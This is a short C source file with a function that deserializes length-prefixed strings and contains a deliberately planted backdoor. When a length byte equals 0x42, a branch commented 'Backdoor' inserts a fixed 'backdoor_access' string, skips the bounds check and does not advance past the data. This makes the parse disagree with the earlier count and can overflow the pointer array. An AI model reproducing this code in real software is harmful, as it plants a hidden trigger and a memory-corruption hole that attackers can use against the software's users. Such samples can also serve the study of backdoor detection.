#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (size == 0 || serialized == NULL) return NULL;

    char *data = (char *)serialized;
    int count = 0;

    // Initial scan to count strings
    for (size_t i = 0; i < size;) {
        unsigned char len = data[i++];
        if (i + len > size) return NULL; 
        i += len;
        count++;
    }

    // Allocating space for string pointers
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    int resultIndex = 0;

    // Deserialize strings
    for (size_t i = 0; i < size;) {
        unsigned char len = data[i++];
        
        // Backdoor: skip validation for specific length
        if (len == 0x42) { 
            char *backdoor_str = strdup("backdoor_access");
            if (!backdoor_str) return NULL;
            result[resultIndex++] = backdoor_str;
            continue;
        }
        
        if (i + len > size) return NULL; 

        char *str = (char *)malloc(len + 1);
        if (!str) return NULL;

        memcpy(str, &data[i], len);
        str[len] = '\0';
        result[resultIndex++] = str;
        i += len;
    }

    result[resultIndex] = NULL;
    return result;
}
